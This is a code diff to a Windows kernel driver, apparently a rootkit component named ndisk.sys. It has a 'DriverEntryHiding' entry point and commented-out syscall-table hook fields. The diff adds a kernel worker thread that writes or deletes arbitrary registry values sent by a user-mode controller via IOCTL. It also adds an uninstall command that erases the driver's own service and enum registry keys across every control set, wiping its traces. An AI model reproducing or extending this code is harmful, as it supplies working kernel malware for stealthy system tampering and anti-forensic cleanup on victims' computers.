@@ -1,6 +1,7 @@
 #include "ntddk.h"
 #include "driver.h"
 #include "enumproc.h"
+#include "stdio.h"
 #include "main.h"
 
 typedef unsigned int DWORD;
@@ -65,11 +66,16 @@ typedef DWORD (NTAPI *PsGetCurrentProcessId_t)(void);
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #define SystemProcessesAndThreadsInformation 5 
 
-DWORD g_semaphore;
+typedef struct {
+	DWORD delete_key;
+	DWORD delete_value;
+	DWORD write_value;
+} worker_action_struct;
+worker_action_struct worker_action = {FALSE, FALSE, FALSE};
+
 WCHAR g_key_name[256];
 WCHAR g_value_name[50];
 WCHAR g_value[1024];
-DWORD g_is_deleting;
 
 //PVOID *g_mapped_sys_table = NULL;	// Puntatore alla sys call tables scrivibile
 //JPE *jumper_entry = NULL;	// Struttura dati per l'hook
@@ -287,6 +293,13 @@ BOOLEAN CheckSIEPointer(SIE *sid_array)
 	return TRUE;
 }
 
+NTSTATUS do_ioctl_uninstall(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
+{
+	worker_action.delete_key = TRUE;
+
+	return STATUS_SUCCESS;
+}
+
 NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
 {
 	DWORD i, j;
@@ -388,19 +401,33 @@ NTSTATUS do_ioctl_reg(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION
 	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(REE) ) {
 		registry_struct = (REE *)Irp->AssociatedIrp.SystemBuffer;
 
-		g_is_deleting = registry_struct->is_deleting;
 		MemCopy(g_key_name, registry_struct->key_name, sizeof(g_key_name));
 		MemCopy(g_value_name, registry_struct->value_name, sizeof(g_value_name));
 		MemCopy(g_value, registry_struct->value, sizeof(g_value));
 
-		g_semaphore = 1;
+		if (registry_struct->is_deleting) 
+			worker_action.delete_value = TRUE;
+		else 
+			worker_action.write_value = TRUE;
 	}
 
 	return STATUS_SUCCESS;
 }
 
-
-void WorkerThread (IN DWORD *semaphore)
+void DeleteRegistryKey(WCHAR *name)
+{
+	HANDLE hkservice;
+	OBJECT_ATTRIBUTES oa;
+	UNICODE_STRING KeyName;
+	RtlInitUnicodeString(&KeyName, name);
+	InitializeObjectAttributes(&oa, &KeyName, OBJ_CASE_INSENSITIVE, 0, NULL);
+	if (ZwOpenKey( &hkservice, DELETE, &oa ) == STATUS_SUCCESS) {
+		ZwDeleteKey(hkservice);
+		ZwClose(hkservice);
+	}
+}
+ 
+void WorkerThread (IN worker_action_struct *wa)
 {
 	LARGE_INTEGER interval;
 	interval.HighPart = -1;
@@ -408,14 +435,35 @@ void WorkerThread (IN DWORD *semaphore)
 	
 	for(;;) {
 		KeDelayExecutionThread(UserMode, FALSE, &interval);
+		
+		if (wa->delete_value) {
+			RtlDeleteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name);
+			wa->delete_value = FALSE;
+		}
+		
+		if (wa->write_value) {
+			RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name, REG_EXPAND_SZ, g_value, (wcslen(g_value)+1)*sizeof(WCHAR));
+			wa->write_value = FALSE;
+		}
 
-		if (*semaphore == 1) {
-			if (g_is_deleting) 
-				RtlDeleteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name);
-			else 
-				RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, g_key_name, g_value_name, REG_EXPAND_SZ, 
-										g_value, (wcslen(g_value)+1)*sizeof(WCHAR));
-			*semaphore = 0;
+		if (wa->delete_key) {
+			DWORD control_set = 1;
+			WCHAR reg_key_name[256];
+			for (; control_set<10; control_set++) {
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\Enum\\Root\\LEGACY_NDISK.SYS\\0000\\Control", control_set);
+				DeleteRegistryKey(reg_key_name);
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\Enum\\Root\\LEGACY_NDISK.SYS\\0000", control_set);
+				DeleteRegistryKey(reg_key_name);
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\Enum\\Root\\LEGACY_NDISK.SYS", control_set);
+				DeleteRegistryKey(reg_key_name);
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\services\\ndisk.sys\\Enum", control_set);
+				DeleteRegistryKey(reg_key_name);
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\services\\ndisk.sys\\Security", control_set);
+				DeleteRegistryKey(reg_key_name);
+				swprintf(reg_key_name, L"\\Registry\\Machine\\System\\ControlSet00%d\\services\\ndisk.sys", control_set);
+				DeleteRegistryKey(reg_key_name);
+			}
+			wa->delete_key = FALSE;
 		}
 	}
 }
@@ -471,8 +519,7 @@ NTSTATUS DriverEntryHiding( IN PDRIVER_OBJECT dobj, IN PUNICODE_STRING regpath)
 	} while(0);*/
 
 	// Thread per le scritture nel registry
-	g_semaphore = 0;
-	PsCreateSystemThread(&WorkerThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, WorkerThread, &g_semaphore);
+	PsCreateSystemThread(&WorkerThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, WorkerThread, &worker_action);
 
 	return STATUS_SUCCESS;
 }
